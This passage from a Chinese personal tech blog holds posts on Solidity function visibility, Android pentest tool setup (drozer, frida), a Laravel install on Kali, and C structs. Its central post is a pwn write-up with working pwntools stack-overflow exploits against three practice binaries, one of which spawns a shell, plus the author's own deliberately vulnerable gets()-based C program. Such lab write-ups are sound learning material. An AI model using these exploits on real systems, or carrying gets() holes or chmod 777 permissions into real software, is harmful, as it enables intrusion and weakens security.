test&#123;   </span><br><span class="line">    function callFun() public &#123;</span><br><span class="line">        //fun1();   </span><br><span class="line">        fun2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们可以明确的看到private的效果，和internal类似，但是代价会更大。  </p>
<p>&emsp;&emsp;然而 <strong>public</strong> 与 <strong>private</strong> 还可以被作用于其他的变量，用于设置外部访问权限。  </p>
<p>&emsp;&emsp;请大家务必不要弄混 <strong>调用方式</strong> 与 <strong>可见性(visable)</strong> 。  </p>
<ul>
<li><strong>this</strong> </li>
</ul>
<p>&emsp;&emsp;在Solidity中，this与其他高级语言意义不同，这里的this指的是当前合约的一个实例化对象，而并不是只的合约本身，this可以理解为实现external调用的一种方式，在初始化未完成时强制调用external类型方法。而并不能指代当前合约类型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= 0.4.0 &lt; 0.6.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function fun1() external&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function fun2() public&#123;</span><br><span class="line">        this.fun1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>getter</strong>  </li>
</ul>
<p>&emsp;&emsp;编译器会为公共状态变量提供一个getter(访问器)函数，对mapping和数组以及枚举类型也提供了对应的getter，mapping的key 数组的下标 枚举的名都具有getter，访问器的visable为external。  </p>
<hr>
<h4 id="2-关于-view-pure-constant"><a href="#2-关于-view-pure-constant" class="headerlink" title="2. 关于 view pure constant"></a>2. 关于 view pure constant</h4><p>&emsp;&emsp;在0.4.1之前只有constant这一种可爱的语法，就是有一些屁事很多的人觉得constant指的是变量，作用于函数不太合适，所以就把constant拆成了view和pure。  </p>
<p>&emsp;&emsp;在Solidity中，<strong>constant view pure</strong> 的作用是告诉编译器，函数 <strong>不改变</strong>，<strong>不读取</strong>状态变量，这样一来函数的执行就不再消耗gas了，因为不再需要矿工去验证。  </p>
<p>&emsp;&emsp;然而这三个东西有点有意思，在官方文档中用 <strong>restrictive</strong> 这一词来对函数的严格性进行描述，在函数类型转换时对严格行有一定的要求，高严格性函数可以被转化为低严格性函数：  </p>
<ul>
<li><p><strong> pure </strong> 类型可被转化为 <strong>view</strong> 和 <strong>non-payable</strong> 函数  </p>
</li>
<li><p><strong>view</strong> 类型可被转化为 <strong>non-payable</strong> 函数  </p>
</li>
<li><p><strong>payable</strong> 类型可被转化为 <strong>non-payable</strong> 函数  </p>
</li>
</ul>
<p>&emsp;&emsp;真是令人头秃！</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/toutu.jpg?raw=true" alt="toutu">  </p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-02-13</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/02/13/pwn-write-up/">pwn_write_up</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="一些pwn题的write-up"><a href="#一些pwn题的write-up" class="headerlink" title="一些pwn题的write_up"></a>一些pwn题的write_up</h3><p>&emsp;&emsp;pwn题就是好玩,做了几道题，写一波writeUp。<br>&emsp;&emsp;点击标题可下载题目。  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_0.jpeg?raw=true" alt="alias">  </p>
<h4 id="1-crackme0x00"><a href="#1-crackme0x00" class="headerlink" title="1. crackme0x00"></a><a href="https://github.com/Explainaur/hexo-blog/blob/master/source/file/bin-linux/crackme0x00" target="_blank" rel="noopener">1. crackme0x00</a></h4><p>&emsp;&emsp;首先我们把这玩意扔到radare2里，先逆了再说。<br>&emsp;&emsp;看了一下main()大概长着个样子：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_1.png?raw=true" alt="main">  </p>
<p>&emsp;&emsp;然后下面的分支大概长这个样子：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_2.png?raw=true" alt="brench">  </p>
<p>&emsp;&emsp;大概意思就是，假如我输入的字符串等于250382就算我成功了。本身到这里其实题目已经做完了，但是为了实践stackoverflow，我们要用厉害的方法。</p>
<p>&emsp;&emsp;我们可以看到有一个局部变量 <strong>char *s1 @ ebp-0x18</strong> 这说明这个字符串距离栈基址有 <strong>0x18 (24byte)</strong> 这么远.那么此时 <strong>s1</strong> 就距离 <strong>return_address</strong> 有 0x18+4 这么远.这个时候，我们就可以做一些恶心的事情，比如：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./crackme0x00'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + <span class="string">'bbbb'</span> + p32(<span class="number">0x8048480</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们这样构造payload的原因是，我们希望 <strong>return</strong> 的地址是我们想要的指令.我们前面输入了一堆aaa和bbbb这是为啥嘞？24个a为了填充s1与esp的值的间隔，而4个b则是为了恰好覆盖ebp.<br>&emsp;&emsp;这样一来，后面的 <strong>p32(0x8048480)</strong> 就恰好存到了return_address的位置，也就起到了我们要的劫持指令的效果。结果长下面这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_3.png?raw=true" alt="result">  </p>
<h4 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2. ret2text"></a><a href="https://github.com/Explainaur/hexo-blog/blob/master/source/file/ret2text" target="_blank" rel="noopener">2. ret2text</a></h4><p>&emsp;&emsp;这个题稍微有点难度，我们用r2先逆为敬.<br>&emsp;&emsp;main()大概长下面这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_4.png?raw=true" alt="main">  </p>
<p>&emsp;&emsp;我们可以看到里面有 <strong>gets()</strong> 函数，这个东西是坨垃圾，他不限制输入的长度，所以很有可能把缓冲区怼爆，所以我们就想法子日这个函数。<br>&emsp;&emsp;我们看到里面有个局部变量 <strong>char *s @ esp+0x1c</strong> ,gets()函数的值就存在s里面。这个时候我们不禁萌生了一些猥琐的想法。<br>&emsp;&emsp;我们接着看其他还有啥函数，毕竟main()里没有好利用的东西，这个时候我们发现了 <strong>sym.secure</strong> 这个函数：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_5.png?raw=true" alt="sym.secure">  </p>
<p>&emsp;&emsp;我们仔细看了一下发现，果然里面有见不得人的东西，它调用了 <strong>system(“/bin/bash”)</strong>,这我们还能说什么，直接跳转到 <strong>0x0804863a</strong> 日了他完事。下面就是愉快的编写payload，我灵机一动发现事情并不简单，这个局部变量并不是基于 <strong>ebp</strong> 的偏移地址，而是基于 <strong>esp</strong> 栈顶指针给出的，不知道他用了什么妖术。这样的话我们只好用gdb动态调试：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_6.png?raw=true" alt="gdb">  </p>
<p>&emsp;&emsp;我们在<strong>gets()</strong>那里打上断点，然后看一下寄存器的值：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$esp -&gt; 0xffffd030</span><br><span class="line"></span><br><span class="line">$ebp -&gt; 0xffffd0b8</span><br><span class="line"></span><br><span class="line">s @ $esp+0x1c -&gt; 0xffffd04c</span><br><span class="line"></span><br><span class="line">($ebp - s) -&gt; 0xfffd0b8 - 0xffffd04c = 0x6c</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;一顿帅气操作我们已经得到了s基于<strong>ebp</strong>的偏移地址，下面我们就愉快的写payload：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    </span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x0804863a</span>  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x6c</span> + <span class="string">'bbbb'</span> + p32(target)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload) </span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;下面就是我们的结果：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_7.png?raw=true" alt="result">  </p>
<h4 id="3-babyPwn"><a href="#3-babyPwn" class="headerlink" title="3. babyPwn"></a><a href="https://github.com/Explainaur/hexo-blog/blob/master/source/file/1" target="_blank" rel="noopener">3. babyPwn</a></h4><p>&emsp;&emsp;这个题就比较简单了，程序也是我自己写的，下面是源码：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;   </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];        </span><br><span class="line">    gets(s);           </span><br><span class="line">    <span class="built_in">puts</span>(s);           </span><br><span class="line">    <span class="keyword">return</span>;            </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;直接逆,main()和sym.vulnerable()大概下面这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_8.png?raw=true" alt="main&amp;vulnerable">  </p>
<p>&emsp;&emsp;这个逻辑也比较简单，我们看main()里面好像啥也没有，接着看<strong>vulnerable()</strong>里面又出现了gets()这种东西，好了怼他，我们看到这个局部变量<strong>char s @ ebp-0x14</strong>中规中矩，给的也是基于 <strong>ebp</strong> 的偏移地址。<br>&emsp;&emsp;接着我们看一看别的函数，里面有个醒目的 <strong>sym.success</strong> 是结果没跑了，一看长这样：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_9.png?raw=true" alt="sym.success">  </p>
<p>&emsp;&emsp;那我们就直接把success()的地址放在vulnerable()的返回值那里，让他直接跳转，思路清晰，下面愉快的写payload：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./1'</span>)</span><br><span class="line"></span><br><span class="line">success_addr = <span class="number">0x08049172</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">20</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;然后结果就长这个样子：  </p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/pwn_10.png?raw=true" alt="result">  </p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&emsp;&emsp;总之，我认为pwn是入侵的最高境界，是一种暴力美学，如果说web能拿到一些主机的权限，那么pwn能拿到世界上所有主机的权限。<br>&emsp;&emsp;漏洞的利用千奇百怪，绝不要被教条束缚了头脑，始终忘不了第一次见到如此简洁的shellcode时的惊讶。二进制就像魔法，我就是寻求刺激的魔法师。<br>&emsp;&emsp;以上三道题目是入门题，我要走的路还很长。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-01-17</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/01/17/测试环境的搭建/">测试环境的搭建</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <p>&emsp;&emsp;到了公司以后，目前在学习android客户端的渗透测试。在看过用例之后觉得也不很难，主要是搭环境是真的恶心，反正windows下就是各种不顺，还是linux比较方便。记录一下各种工具的安装和使用把。  </p>
<h3 id="drozer的安装"><a href="#drozer的安装" class="headerlink" title="drozer的安装"></a>drozer的安装</h3><hr>
<p>&ensp;&emsp;在linux下安装是真的顺畅,首先要安装python——wheel的环境，至于这是个啥目前我还不太清楚： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mwrlabs/drozer/</span><br><span class="line"></span><br><span class="line">cd drozer</span><br><span class="line"></span><br><span class="line">python setup.py bdist_wheel</span><br></pre></td></tr></table></figure>
<p>&nbsp;然后就可以pip install了  </p>
<h4 id="注意，pip3还是pip取决于python环境"><a href="#注意，pip3还是pip取决于python环境" class="headerlink" title="注意，pip3还是pip取决于python环境"></a>注意，pip3还是pip取决于python环境</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install drozer</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当然了你也可以直接去github上直接git clone。<br>&emsp;&emsp;到这里，电脑端的drozer就安装完成了，接下来我们要安装移动测试端的agent.apk<br>&emsp;&emsp;这里我们要去<a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk" target="_blank" rel="noopener">drozer_agent.apk</a>去下载agent.apk,然后用adb直接安装就好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install drozer-agent-2.x.x.apk</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;好了，到这里安装已经结束了，接下来我们测试以下，首先我们要开启端口转发：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;然后，在手机端打开drozer的开关  </p>
<p><img src="https://raw.githubusercontent.com/Explainaur/hexo-blog/master/source/pictures/Screenshot_20190117-104036.jpg" alt="agent.apk"></p>
<p>&emsp;&emsp;接下来我们要通过drozer console 来连接手机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drozer console connect ---server ip_of_your_phone</span><br><span class="line"></span><br><span class="line">注意：这里是使用真机测试 所以后面要加上手机的ip做参数，</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;假如你使用的是模拟器，就可以直接:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drozer console connect</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/Explainaur/hexo-blog/master/source/pictures/drozer.png" alt="drozer_console"></p>
<p>&emsp;&emsp;好了，到此为止已经测试完成了</p>
<p>&emsp;&emsp;其实直接输入drozer就能得到提示，人家的文档写的还是很不错的，用法以后再补。</p>
<h3 id="frida的安装"><a href="#frida的安装" class="headerlink" title="frida的安装"></a>frida的安装</h3><p>&emsp;&emsp;frida是一个很牛逼的框架，能hook能注入反正就是各种牛逼，我目前还不太熟悉android，所以高级操作我也不会。<br>&emsp;&emsp;这个东西嘛，反正我在windows下是各种崩，所以直在linux下安装了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先要安装python3</span><br><span class="line"></span><br><span class="line">pip install frida-tools</span><br><span class="line"></span><br><span class="line">pip install frida</span><br><span class="line"></span><br><span class="line">npm install frida</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这个三条命令一输，完事儿。(垃圾windows</p>
<p>&emsp;&emsp;然后去<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">这里</a>下载frida的客户端  </p>
<h4 id="注意，一定要下载对应的版本号，要与电脑断相同"><a href="#注意，一定要下载对应的版本号，要与电脑断相同" class="headerlink" title="注意，一定要下载对应的版本号，要与电脑断相同"></a>注意，一定要下载对应的版本号，要与电脑断相同</h4><p>&emsp;&emsp;然后用adb把frida-server安装到手机并运行，然后我们测试一下： </p>
<p><img src="https://raw.githubusercontent.com/Explainaur/hexo-blog/master/source/pictures/frida.png" alt="frida-ps -U"></p>
<p>&emsp;&emsp;好了，到此为止frida搭建完毕。</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-12</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/12/laravel-with-kali/">Laravel with kali</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="记录一下在Kali下如可搭建Laravel环境"><a href="#记录一下在Kali下如可搭建Laravel环境" class="headerlink" title="记录一下在Kali下如可搭建Laravel环境"></a>记录一下在Kali下如可搭建Laravel环境</h3><hr>
<p>&emsp;&emsp;我的天呐,<strong>Kali</strong>安装个<strong>Laravel</strong>是真的难,不是权限问题就是依赖问题,统一记录一下吧.<br>&emsp;&emsp;首先要新建一个普通用户<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">useradd -m dyf -s zsh -d /home/dyf </span><br><span class="line">passwd  dyf                                             //然后就输入密码</span><br><span class="line">usermod                                                 //可修改用户状态</span><br><span class="line">userdel                                                 //可删除用户</span><br><span class="line">visudoers 将用户加入sudoers</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;关于<strong>useradd</strong>的参数用法:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-c comment 指定一段注释性描述。</span><br><span class="line">-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。</span><br><span class="line">-g 用户组 指定用户所属的用户组。</span><br><span class="line">-G 用户组，用户组 指定用户所属的附加组。</span><br><span class="line">-s Shell文件 指定用户的登录Shell。</span><br><span class="line">-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接着是最恶心的部分,安装<strong>php</strong>依赖:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y libapache2-mod-php7.0</span><br><span class="line">sudo apt-get install -y php7.0-mysql</span><br><span class="line">sudo apt-get install php7.2-zip</span><br><span class="line">sudo apt-get install php-common php-mbstring php-xml php-zip php-json php-mcrypt</span><br><span class="line">sudo apt-get install php-mbstring</span><br><span class="line">sudo apt install libapache2-mod-php</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;弄完了这么一堆恶心的东西之后,心态差了许多.<br>&emsp;&emsp;现在开始我们已经可以真正开始了.第一步是安装<strong>php</strong>的包管理<strong>composer</strong>:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">suod apt upgrade</span><br><span class="line">sudo apt install -y composer</span><br><span class="line">composer                       //此时有参数选项则安装成功</span><br><span class="line">sudo chmod 777 /home/dyf                                  //增加写入权限</span><br><span class="line">composer config -g repo.packagist composer https://packagist.laravel-china.org   //更换composer源</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;此时<strong>composer</strong>已经安装完毕,下面开始正式安装Laravel:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">composer global require "laravel/installer"</span><br><span class="line">PATH=$PATH:/home/dyf/.config/composer/vendor/bin        //修改为全局变量</span><br></pre></td></tr></table></figure></p>
<p>到这里已经差多完了,缺啥东西自己去<strong>stackoverflow</strong>上面查吧,心力憔悴.<br>然后嘞,你需要去修改<code>/etc/apache2/sites-aviliable/000-default.conf</code>把默认路径改一下.<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel</span><br><span class="line">chmod -R 777 public storage bootstrap                             //给权限</span><br><span class="line">vim /etc/apache2/apache2.conf                  //找到'/var/www'将AllowOverride改为all</span><br><span class="line">sudo a2enmod rewrite                           //开启重写模式</span><br><span class="line">composer install</span><br><span class="line">composer update</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;接着为新项目建立一个新的mysql账户,一定要安装php7.x-mysqli的包,否则 mysqliconnect() 将无法使用.安装php-curl</p>
<p>&emsp;&emsp;开始干活吧.</p>
<h6 id="ps-我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod-php7-修改。"><a href="#ps-我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod-php7-修改。" class="headerlink" title="ps:我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod php7.*修改。"></a>ps:我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod php7.*修改。</h6><h5 id="我又双重装了系统，这次提供的node版本是11-0-根本不支持之前的版本，踏马只能用-npm-rebuild-node-sass-–force-回滚原先的版本。"><a href="#我又双重装了系统，这次提供的node版本是11-0-根本不支持之前的版本，踏马只能用-npm-rebuild-node-sass-–force-回滚原先的版本。" class="headerlink" title="我又双重装了系统，这次提供的node版本是11.0,根本不支持之前的版本，踏马只能用 npm rebuild node-sass –force 回滚原先的版本。"></a>我又双重装了系统，这次提供的node版本是11.0,根本不支持之前的版本，踏马只能用 <strong>npm rebuild node-sass –force</strong> 回滚原先的版本。</h5>
        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-02</span>
          
            
              <span class="post-category"><a href="/categories/C/">C</a></span>
            
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/02/对C结构的理解/">对C结构的理解</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="记录一下学习C结构的想法"><a href="#记录一下学习C结构的想法" class="headerlink" title="记录一下学习C结构的想法"></a>记录一下学习C结构的想法</h3><hr>
<p> 我认为结构这种数据类型为C++奠定了面向对象的基础。这是一种很自由的数据类型，我们甚至可以用指针和结构实现面向对象。  </p>
<ul>
<li><p><strong>关于结构的声明</strong>    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span>&#123;</span>  </span><br><span class="line">  　type1 a;</span><br><span class="line">  　type2 b;　　</span><br><span class="line">&#125;;       <span class="comment">//注意这里的分号</span></span><br></pre></td></tr></table></figure>
<p>这里的声明并未创建一个实际的数据对象，而是描述了这类对象的元素形式，我们也可以将结构声明称之为模板，因为他勾勒出数据将如何存储。<br>之后我们声明name结构的变量：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br></pre></td></tr></table></figure>
<p>当编译器读到这条指令时，它将以name模板为dyf分配内存空间，即使未初始化，该结构的大小也由type1 与 type2 的大小决定。这就意味着结构的大小可能会大于数据集本身，因为系统对数据的对齐要求会导致存储裂缝。<br>再者，我们可以如下声明：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span>  </span><br><span class="line">　　type1 a;  </span><br><span class="line">　　type2 b;　　  </span><br><span class="line">&#125; dyf;</span><br></pre></td></tr></table></figure>
<h2 id="即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。"><a href="#即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。" class="headerlink" title="即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。  "></a>即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。  </h2></li>
</ul>
<ul>
<li><strong>关于结构的初始化</strong>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> &#123;</span>  </span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">int</span>  weight[<span class="number">20</span>];</span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">math</span>&#123;</span></span><br><span class="line">  <span class="string">"高等数学"</span>，</span><br><span class="line">  <span class="number">20</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>非指定初始化应当保持初始化项目与结构成员类型一一对应。<br>而指定初始化则类似于数组：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">dyf</span>&#123;</span></span><br><span class="line">  .name=<span class="string">"高等数学"</span>,</span><br><span class="line">  .weight=<span class="number">10</span>      </span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure>
<p>其中的.name类似于数组的下标，寻址自然与数组类似。  </p>
<hr>
<ul>
<li><strong>关于结构数组的声明</strong>  </li>
</ul>
